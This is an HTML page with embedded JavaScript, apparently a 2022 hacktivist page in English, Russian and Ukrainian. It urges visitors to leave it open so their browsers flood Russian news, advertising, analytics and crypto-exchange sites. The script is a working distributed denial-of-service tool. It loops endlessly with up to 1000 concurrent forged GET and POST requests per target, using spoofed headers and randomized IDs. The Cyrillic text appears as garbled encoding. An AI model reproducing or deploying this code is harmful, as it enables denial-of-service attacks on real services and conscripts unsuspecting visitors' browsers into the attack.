

<head>
    <meta charset="utf-8" />
    <title>russia MUST BE STOPPED!</title>
  </head>
  <body>
    <h1>Russia MUST BE STOPPED! Help Ukraine WIN!</h1>
    <table width="100%">
      <tr>
        <td width="30%">
          <h3>English version</h3>
          <p>The "official" news in the Russian Federation is mostly fake and we believe it is
              better to shut them down and let people switch to trustful news.</p>
          <p>Please, just open this page and let it be open on your devices. It will flood the
              Russian propaganda websites and pose a huge load on their infrastructure.</p>
          <p>Your browser will be slow. It's ok, don't worry and keep it running.</p>
          <p>A small contribution from each of us will save Ukraine üôè</p>
        </td>
        <td width="30%">
          <h3>–†—É—Å—Å–∫–∞—è –≤–µ—Ä—Å–∏—è</h3>
          <p>¬´–û—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–µ¬ª –Ω–æ–≤–æ—Å—Ç–∏ –≤ –†–§ –ø–æ–ª–Ω—ã –ø—Ä–æ–ø–∞–≥–∞–Ω–¥—ã –∏ —Ç—Ä–∞–Ω—Å–ª–∏—Ä—É—é—Ç –ª–∂–∏–≤—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ
              —Å–æ–±—ã—Ç–∏—è—Ö –Ω–∞ –£–∫—Ä–∞–∏–Ω–µ. –ú—ã —Å—á–∏—Ç–∞–µ–º, —á—Ç–æ –ª—É—á—à–µ –∏—Ö –∑–∞–∫—Ä—ã—Ç—å –∏ –ø–æ–∑–≤–æ–ª–∏—Ç—å –ª—é–¥—è–º
              –ø–µ—Ä–µ–∫–ª—é—á–∏—Ç—å—Å—è –Ω–∞ –¥–æ—Å—Ç–æ–≤–µ—Ä–Ω—ã–µ –Ω–æ–≤–æ—Å—Ç–∏.</p>
          <p>–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–∫—Ä–æ–π—Ç–µ —ç—Ç—É —Å—Ç—Ä–∞–Ω–∏—Ü—É –Ω–∞ –≤–∞—à–∏—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞—Ö. –≠—Ç–æ –∑–∞–ª—å—ë—Ç —Ä–æ—Å—Å–∏–π—Å–∫–∏–µ
              –ø—Ä–æ–ø–∞–≥–∞–Ω–¥–∏—Å—Ç—Å–∫–∏–µ —Å–∞–π—Ç—ã –∑–∞–ø—Ä–æ—Å–∞–º–∏ –∏ —Å–æ–∑–¥–∞—Å—Ç –æ–≥—Ä–æ–º–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –Ω–∞ –∏—Ö
              –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—É.</p>
          <p>–í–∞—à –±—Ä–∞—É–∑–µ—Ä –±—É–¥–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å –º–µ–¥–ª–µ–Ω–Ω–æ. –í—Å–µ –≤ –ø–æ—Ä—è–¥–∫–µ, –Ω–µ –≤–æ–ª–Ω—É–π—Ç–µ—Å—å –∏ –¥–µ—Ä–∂–∏—Ç–µ –µ–≥–æ
              –æ—Ç–∫—Ä—ã—Ç—ã–º.</p>
          <p>–ù–µ–±–æ–ª—å—à–æ–π –≤–∫–ª–∞–¥ –∫–∞–∂–¥–æ–≥–æ –∏–∑ –Ω–∞—Å —Å–ø–∞—Å–µ—Ç –£–∫—Ä–∞–∏–Ω—É üôè</p>
        </td>
        <td width="30%">
          <h3>–£–∫—Ä–∞—ó–Ω—Å—å–∫–∞ –≤–µ—Ä—Å—ñ—è</h3>
          <p>¬´–û—Ñ—ñ—Ü—ñ–π–Ω—ñ¬ª –Ω–æ–≤–∏–Ω–∏ –≤ –†–§ —Å–ø–æ–≤–Ω–µ–Ω—ñ –ø—Ä–æ–ø–∞–≥–∞–Ω–¥–∏ —Ç–∞ —Ç—Ä–∞–Ω—Å–ª—é—é—Ç—å –±—Ä–µ—Ö–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ
              –ø–æ–¥—ñ—ó –≤ –£–∫—Ä–∞—ó–Ω—ñ. –ú–∏ –≤–≤–∞–∂–∞—î–º–æ, —â–æ –∫—Ä–∞—â–µ —ó—Ö –∑–∞–∫—Ä–∏—Ç–∏ —Ç–∞ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –ª—é–¥—è–º –ø–µ—Ä–µ–∫–ª—é—á–∏—Ç–∏—Å—è
              –Ω–∞ –¥–æ—Å—Ç–æ–≤—ñ—Ä–Ω—ñ –Ω–æ–≤–∏–Ω–∏.</p>
          <p>–ë—É–¥—å –ª–∞—Å–∫–∞, –≤—ñ–¥–∫—Ä–∏–π—Ç–µ —Ü—é —Å—Ç–æ—Ä—ñ–Ω–∫—É –Ω–∞ –≤–∞—à–æ–º—É –ø—Ä–∏—Å—Ç—Ä–æ—ó. –¶–µ –∑–∞–∫–∏–¥–∞—î —Ä–æ—Å—ñ–π—Å—å–∫—ñ
              –ø—Ä–æ–ø–∞–≥–∞–Ω–¥–∏—Å—Ç—Å—å–∫—ñ —Å–∞–π—Ç–∏ –∑–∞–ø–∏—Ç–∞–º–∏ —Ç–∞ —Å—Ç–≤–æ—Ä–∏—Ç—å –≤–µ–ª–∏—á–µ–∑–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –Ω–∞ —ó—Ö–Ω—é
              —ñ–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—É.</p>
          <p>–í–∞—à –±—Ä–∞—É–∑–µ—Ä –ø—Ä–∞—Ü—é–≤–∞—Ç–∏–º–µ –ø–æ–≤—ñ–ª—å–Ω–æ. –í—Å–µ –≥–∞—Ä–∞–∑–¥, –Ω–µ —Ö–≤–∏–ª—é–π—Ç–µ—Å—è —Ç–∞ —Ç—Ä–∏–º–∞–π—Ç–µ –π–æ–≥–æ
              –≤—ñ–¥–∫—Ä–∏—Ç–∏–º.</p>
          <p>–ù–µ–≤–µ–ª–∏–∫–∏–π –≤–Ω–µ—Å–æ–∫ –∫–æ–∂–Ω–æ–≥–æ –∑ –Ω–∞—Å –≤—Ä—è—Ç—É—î –£–∫—Ä–∞—ó–Ω—É üôè</p>
        </td>
      </tr>
     </table>
     <div id="stats"></div>
  
  <script>
  const chars1       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const chars1Length = chars1.length;

  const chars2       = '0123456789abcdef';
  const chars2Length = chars1.length;

  const makeAnyID = (length, chars, charsLenght) => {
      var result = '';
      for (var i = 0; i < length; i++) {
          result += chars1.charAt(Math.floor(Math.random() * chars1Length));
      }
      return result;
  };

  const makeid = (length) => makeAnyID(length, chars1, chars1Length);
  const makeidHexa = (length) => makeAnyID(length, chars2, chars2Length);
  const now = () => Math.floor(Date.now() / 1000);

  var targets = {
    // GET:
    'https://gum.criteo.com/sid/json?origin=publishertag&domain=rt.com&sn=ChromeSyncframe&so=0&topUrl=russian.rt.com&cw=1&lsw=1': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://mc.yandex.ru/watch/344709/1?wmode=7&page-url=https%3A%2F%2Fwww.gazeta.ru%2Fpolitics%2Fnews%2F2022%2F02%2F26%2F17350597.shtml%3Fupdated&page-ref=https%3A%2F%2Fwww.gazeta.ru%2Fpolitics%2Fnews%2F2022%2F02%2F26%2F17350597.shtml&nohit=1&charset=utf-8&cnt-class=1&browser-info=pv%3A1%3Agdpr%3A14%3Avf%3A7oivoctnsftpvxmegov%3Afu%3A0%3Aen%3Autf-8%3Ala%3Aen-US%3Av%3A760%3Acn%3A3%3Adp%3A1%3Als%3A1040796888110%3Ahid%3A905254112%3Az%3A420%3Ai%3A20220227104955%3Aet%3A1645933795%3Ac%3A1%3Arn%3A915453336%3Au%3A1645933161222770635%3Aw%3A1688x542%3As%3A3440x1440x24%3Ask%3A1%3Acpf%3A1%3Aeu%3A0%3Ans%3A1645933789441%3Awv%3A2%3Aco%3A0%3Aadb%3A2%3App%3A3629563401%3Arqnl%3A1%3Ast%3A1645933795%3At%3A%D0%A0%D0%BE%D1%81%D1%81%D0%B8%D1%8F%20%D0%BF%D0%BE%D0%B4%D1%82%D0%B2%D0%B5%D1%80%D0%B4%D0%B8%D0%BB%D0%B0%20%D0%A2%D1%83%D1%80%D1%86%D0%B8%D0%B8%20%D0%B3%D0%BE%D1%82%D0%BE%D0%B2%D0%BD%D0%BE%D1%81%D1%82%D1%8C%20%D0%BA%C2%A0%D1%83%D1%80%D0%B5%D0%B3%D1%83%D0%BB%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D1%8E%20%D0%BA%D1%80%D0%B8%D0%B7%D0%B8%D1%81%D0%B0%20%D0%BD%D0%B0%C2%A0%D0%A3%D0%BA%D1%80%D0%B0%D0%B8%D0%BD%D0%B5%20-%20%D0%93%D0%B0%D0%B7%D0%B5%D1%82%D0%B0.Ru%20%7C%20%D0%9D%D0%BE%D0%B2%D0%BE%D1%81%D1%82%D0%B8&t=gdpr%2814%29mc%28p-7%29lt%28128900%29aw%281%29ti%282%29': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://russian.rt.com/widget/news-of-hour/json': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://yandex.ru/set/s/rsya-tag-users/data?referrer=https%3A%2F%2Frussian.rt.com%2F': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://cleanbtc.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://bonkypay.com': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://mine.exchange': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://betatransfer.org': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://ramon.money': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://bitokk.biz': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://api.netex24.net/exchangeDirection/getAll': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://cashbank.pro': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://flashobmen.com': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://ychanger.net': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://multichange.net': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://24paybank.net': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://royal.cash': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://prostocash.com': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://baksman.org': { number_of_requests: 0, number_of_errored_responses: 0 },
    'https://kupibit.me': { number_of_requests: 0, number_of_errored_responses: 0 },

    // POST:
    'https://smi2.ru/newdata/jsapi?action=news': {
        process: function () {
            return {
                method: 'POST',
                headers: {
                   'Referer': 'https://russian.rt.com/',
                   'Content-Type': 'multipart/form-data',
                },
                body: JSON.stringify({
                    "suid": makeid(72),
                    "block_id": 90702,
                    "source_block_id": 0,
                    "topic_id": 0,
                    "strategy_id": 0,
                    "count": 10,
                    "fields": 14,
                    "filter_news": []
                })
            }
        },
        number_of_requests: 0, number_of_errored_responses: 0
    },
    'https://relap.io/api/v7/stat': {
        process: function () {
            return {
                method: 'POST',
                headers: {
                   'content-type': 'application/json',
                   'authority': 'relap.io',

                },
                body: JSON.stringify({
                  "session_secret":makeid(6),
                  "events":[{"type":"rec_load","widget_cfg_id":makeid(16),"rec_ctx":"oxQWi5zvX2DXx08MeL_EdTkLdDWj_aJJ5amAnWnr__D0GT5GF2vRA73Nf7rSGgpa5nL049SCtj9t8Ani1xiXQvQrTDYD6KiUmS7i1gTHgrXhRJpzrNyMG_GU7drvB6pNKynitLWoQCzaC25C9bhjscuLSH4ReD8tJn86zdQ4GoYyKW5LQKWJ0UL4-ubIyPJodvFqBL-c5H3L8Ur_7PnmXDJDBPrrqZXwUIMtozjPE1VCFWNkQRnPzL7-3Bd1MCZ17XXanAE38O8JNJaPCXBuv_5-FZ8BORApp6o6xQ9TdIAMRK_jfGew4FlCYvFrMsFBnHFOAyv0aiOFtl-r1Se7Qc-_1bDZCWxcUaGqA_pPPEBq2xNgEglVaduWppWfyqYv2eYUpe5iEgRjwkR4UZFzElldeCUwlFWcCoiuD1inc7YWF3XEbxhiJlWTbk2i18LgsAoK4cBarWEFL2KKaeYK7ECI5Hbl_LPEknby4zfsnKDyoR2s633STUlfosOe-Z5HSR1J29B8lIDJRNpezN9PPh20jZNFSgfhSEg_fHGgOF7nWxn43rzDY2GWkyiFw5MoX57NQQH-_Q_qvhmgbTVaHw42EM4uePt4xE-klkOZCzc:R2CJZA","rec_group_ctx":"XOGUFLBQboOwxnRG579TQoywnzTEm-zSFhqSCvyjGKST5qIL6QaZNrIvqJb4xz_TvdJBZWJ1vSANk4E6aLklNpR4dg79US6RQq0WxxRv--83OBujbVOFawsACO5HE_Fi7MaqvxWjNSOuq-2hcxUx2A:ZnbFEg","url":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","referer":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","session_id":"fe86344699d630b7e74cfffc13ea82e3"},{"type":"rec_load","widget_cfg_id":"mHd3AjX0inCKUFBQ","rec_ctx":"njEzch-OmyatjFll3fIcxCxFD0lH65OQ9inKovYOjFCv7_Csfmm9yaTVcAfO2qd6puZ2kQGF9zRd5MgeUg3cGLCxohwBn1u7AKlOvuL2fLbtg2FbgaxpvPv3cTnXLp1O:CiMIQA","rec_group_ctx":"XOGUFLBQboOwxnRG579TQoywnzTEm-zSFhqSCvyjGKST5qIL6QaZNrIvqJb4xz_TvdJBZWJ1vSANk4E6aLklNpR4dg79US6RQq0WxxRv--83OBujbVOFawsACO5HE_Fi7MaqvxWjNSOuq-2hcxUx2A:ZnbFEg","url":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","referer":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","session_id":"fe86344699d630b7e74cfffc13ea82e3"},{"type":"rec_load","widget_cfg_id":"mHd3AjX0inCKUFBQ","rec_ctx":"-1LSx0Wja_2dSmD5lb8OPoxMjVYujsGPwrl7MkOuGnM6pkxTf2mIzTJRVZvIRM4fAQpJ3nIM16_purzZPlxoADMYzb72VnwQqHu5DQ7HL1uf_N2b5Ha6icEay7hBmO77OcTrrggSO8v0Y0B0a7fFSy2YnY_bAWd6Z9xLFWRwBByn3KF4u8lvjIV870kBXQx1CvLuWIbZSIP0_B8OSj9Mfr8hrccKMRh1JlSFe4C9S6-GG313DiJk-fbuUxdZq2mQ-ESxGPmTcsjIgEWyYVcVkwErHSvb5-m3_Wzz4YE5kMU:P48wSQ","rec_group_ctx":"XOGUFLBQboOwxnRG579TQoywnzTEm-zSFhqSCvyjGKST5qIL6QaZNrIvqJb4xz_TvdJBZWJ1vSANk4E6aLklNpR4dg79US6RQq0WxxRv--83OBujbVOFawsACO5HE_Fi7MaqvxWjNSOuq-2hcxUx2A:ZnbFEg","url":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","referer":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","session_id":"fe86344699d630b7e74cfffc13ea82e3"},{"type":"rec_load","widget_cfg_id":"mHd3AjX0inCKUFBQ","rec_ctx":"2AiQJzdSaGIUxq1oXHpyW1BYPMcWCKtz1IweCwDLicUhaVkYTlLQutoC8gNgAEVN7K57oVb61xQoV3-EBhsVqQE2dAhKjwxbj7SYxN3Pr8f2sFQ8vppSUa4V-R9C--7S:fJDfpQ","rec_group_ctx":"XOGUFLBQboOwxnRG579TQoywnzTEm-zSFhqSCvyjGKST5qIL6QaZNrIvqJb4xz_TvdJBZWJ1vSANk4E6aLklNpR4dg79US6RQq0WxxRv--83OBujbVOFawsACO5HE_Fi7MaqvxWjNSOuq-2hcxUx2A:ZnbFEg","url":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","referer":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","session_id":"fe86344699d630b7e74cfffc13ea82e3"},{"type":"rec_load","widget_cfg_id":"mHd3AjX0inCKUFBQ","rec_ctx":"hXYDzUwQANZyANO32O-mmmTG68rcVvwve4p_iJFeSdAswAUW7x1k6FrIspHXezxEwwYiXiKaZ5gtWQdf8wSETkYksByQiHhlt6qPeGp3qOGYjx-7cG5Im5ngy8ZV72gI:JzJCZw","rec_group_ctx":"XOGUFLBQboOwxnRG579TQoywnzTEm-zSFhqSCvyjGKST5qIL6QaZNrIvqJb4xz_TvdJBZWJ1vSANk4E6aLklNpR4dg79US6RQq0WxxRv--83OBujbVOFawsACO5HE_Fi7MaqvxWjNSOuq-2hcxUx2A:ZnbFEg","url":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","referer":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","session_id":"fe86344699d630b7e74cfffc13ea82e3"},{"type":"rec_load","widget_cfg_id":"mHd3AjX0inCKUFBQ","rec_ctx":"-soMvc8b8xBfksxjPsZCrI4GHylRwE15ikS4_5S0uWgLNcAMyUphpPq0n6AcMyxxZxJcHUQipBWz5DUzvQsqHxqZx54UY2kbTXC4WsZ8N25ICyvscavvJzW8PrEyRrt0:rUjhxA","rec_group_ctx":"XOGUFLBQboOwxnRG579TQoywnzTEm-zSFhqSCvyjGKST5qIL6QaZNrIvqJb4xz_TvdJBZWJ1vSANk4E6aLklNpR4dg79US6RQq0WxxRv--83OBujbVOFawsACO5HE_Fi7MaqvxWjNSOuq-2hcxUx2A:ZnbFEg","url":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","referer":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","session_id":makeidHexa(32)}]})
            }
        },
        number_of_requests: 0, number_of_errored_responses: 0
    },
    'https://ad.mail.ru/hbid_yandex/': {
        process: function () {
            return {
                method: 'POST',
                headers: {
                   'content-type': 'application/x-www-form-urlencoded',
                   'authority': 'ad.mail.ru',

                },
                body: JSON.stringify({"places":[{"id":"dummy0","placementId":"878949","sizes":[[240,400]]},{"id":"dummy1","placementId":"893271","sizes":[[240,400]]}],"settings":{"currency":"RUB","windowSize":{"width":1272,"height":542}}})
            }
        },
        number_of_requests: 0, number_of_errored_responses: 0
    },

    'https://24paybank.net/changes/': {
        process: function () {
            return {
                method: 'POST',
                headers: {
                   'content-type': 'application/x-www-form-urlencoded',
                   'accept': 'text/plain, */*; q=0.01',
                },
                body: 'action=getChanges&currpage=https%3A%2F%2F24paybank.net%2F&data%5Bcourse_init%5D=true&in_background=true&queryID=1646063253077&callback=%3A%3A16460631399040_22&query_version=1.1&url=%2Fchanges%2F'
            }
        },
        number_of_requests: 0, number_of_errored_responses: 0
    },

    'https://cleanbtc.ru/ajax-globalajax_wp_check.html?meth=post&yid=f76d23edaa5a&lang=%D0%A0%D1%83%D1%81%D1%81%D0%BA%D0%B8%D0%B9': {
        process: function () {
            return {
                method: 'POST',
                headers: {
                   'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                   'accept': 'application/json, text/javascript, */*; q=0.01',
                },
                body: `link=%2F&ltime=${now()}`
            }
        },
        number_of_requests: 0, number_of_errored_responses: 0
    },

    'https://ychanger.net/changes/': {
        process: function () {
            return {
                method: 'POST',
                headers: {
                   'content-type': 'application/x-www-form-urlencoded',
                   'accept': 'text/plain, */*; q=0.01',
                },
                body: `action=getChanges&currpage=https%3A%2F%2Fychanger.net%2F&data%5Bcourse_init%5D=true&in_background=true&vri=16460642933770&initial=1&queryID=${now()}&callback=%3A%3A16460642933770_1&query_version=1.1&url=%2Fchanges%2F`
            }
        },
        number_of_requests: 0, number_of_errored_responses: 0
    },

    'https://multichange.net/changes/': {
        process: function () {
            return {
                method: 'POST',
                headers: {
                   'content-type': 'application/x-www-form-urlencoded',
                   'accept': 'text/plain, */*; q=0.01',
                },
                body: `action=getChanges&currpage=https%3A%2F%2Fmultichange.net%2F&data%5Bget_course%5D%5Bc1%5D=9&data%5Bget_course%5D%5Bc2%5D=12&data%5Bcourse_init%5D=true&in_background=true&vri=16460643957100&xid=16460643942067&initial=1&queryID=${now()}&callback=%3A%3A16460643957100_1&query_version=1.1&url=%2Fchanges%2F`
            }
        },
        number_of_requests: 0, number_of_errored_responses: 0
    },

    'https://royal.cash/changes/': {
        process: function () {
            return {
                method: 'POST',
                headers: {
                   'content-type': 'application/x-www-form-urlencoded',
                   'accept': 'text/plain, */*; q=0.01',
                },
                body: `action=getChanges&currpage=https%3A%2F%2Froyal.cash%2F&data%5Bcourse_init%5D=true&in_background=true&vri=16460645239480&xid=16460645230584&initial=1&queryID=${now()}&callback=%3A%3A16460645239480_1&query_version=1.1&url=%2Fchanges%2F`
            }
        },
        number_of_requests: 0, number_of_errored_responses: 0
    },

    'https://prostocash.com/changes/': {
        process: function () {
            return {
                method: 'POST',
                headers: {
                   'content-type': 'application/x-www-form-urlencoded',
                   'accept': 'text/plain, */*; q=0.01',
                },
                body: `action=getChanges&currpage=https%3A%2F%2Fprostocash.com%2F&data%5Bclient_dump%5D=d0ad0b7ed4a85e50c71a2d69f90a24c2%3B3440%2C1440&in_background=true&sri=16460646124370&queryID=${now()}&callback=%3A%3A16460646124370_4&query_version=1.1&url=%2Fchanges%2F`
            }
        },
        number_of_requests: 0, number_of_errored_responses: 0
    },

    'https://baksman.org/changes/': {
        process: function () {
            return {
                method: 'POST',
                headers: {
                   'content-type': 'application/x-www-form-urlencoded',
                   'accept': 'text/plain, */*; q=0.01',
                },
                body: `action=getChanges&currpage=https%3A%2F%2Fbaksman.org%2F&data%5Bcourse_init%5D=true&in_background=true&vri=16460646909840&initial=1&queryID=${now()}&callback=%3A%3A16460646909840_1&query_version=1.1&url=%2Fchanges%2F`
            }
        },
        number_of_requests: 0, number_of_errored_responses: 0
    },

  }

  const trunc = (str, num) => {
    if (str.length > num) {
      return str.slice(0, num) + "...";
    } else {
      return str;
    }
  };
  var statsEl = document.getElementById('stats');
  function printStats() {
    statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + trunc(target, 100) + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
  }
  setInterval(printStats, 1000);
  
  var CONCURRENCY_LIMIT = 1000
  var queue = []
  
  async function fetchWithTimeout(resource, options) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), options.timeout);

    var fetchOpt;
    if (targets[resource].process) {
        fetchOpt = targets[resource].process();
    } else {
        fetchOpt = {
            method: 'GET'
         };
    }
    fetchOpt['signal'] = controller.signal;
    fetchOpt['mode'] = 'no-cors';

    console.log(`resource: ${resource}`);
    console.log(`options: ${JSON.stringify(options)}`);
    console.log(`fetchOpt: ${JSON.stringify(fetchOpt)}`);

    return fetch(resource, fetchOpt).then((response) => {
      clearTimeout(id);
      return response;
    }).catch((error) => {
      clearTimeout(id);
      throw error;
    });
  }
  
  async function flood(target) {
    for (var i = 0;; ++i) {
      if (queue.length > CONCURRENCY_LIMIT) {
        await queue.shift()
      }

      queue.push(
        fetchWithTimeout(target, { timeout: 2000 })
          .catch((error) => {
            if (error.code === 20 /* ABORT */) {
              return;
            }
            targets[target].number_of_errored_responses++;
          })
          .then((response) => {
            if (response && !response.ok) {
              targets[target].number_of_errored_responses++;
            }
            targets[target].number_of_requests++;
          })
  
      )
      //return
    }
  }
  
  // Start
  Object.keys(targets).map(flood)
  </script>
  </body>
      